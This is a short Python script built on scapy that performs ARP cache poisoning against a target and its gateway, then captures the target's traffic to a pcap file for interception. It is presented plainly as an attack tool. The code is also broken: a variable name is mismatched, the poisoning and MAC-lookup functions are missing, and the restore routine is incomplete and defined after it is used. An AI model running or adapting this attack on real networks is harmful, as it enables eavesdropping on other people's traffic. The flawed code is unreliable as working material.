from scapy.all import *
import os
import sys
import threading
import signal

interface = "en1"
target_ip = ""
gateway_ip = ""
package_count = 1000

conf.iface = interface

conf.verb = 0

print(f"[*] Setting up {interface}")

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!] Failed to get gateway MAC. Exiting")
    sys.exit(1)
else:
    print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!] Failed to get target MAC. Exiting")
    sys.exit(1)
else:
    print(f"[*] Target {target_ip} is at {target_mac}")

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))

poison_thread.start()

try:
    print(f"[*] Starting sniffer for {packet_count} packets")
    bpf_filter = f"ip host {target_ip}"

    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2))

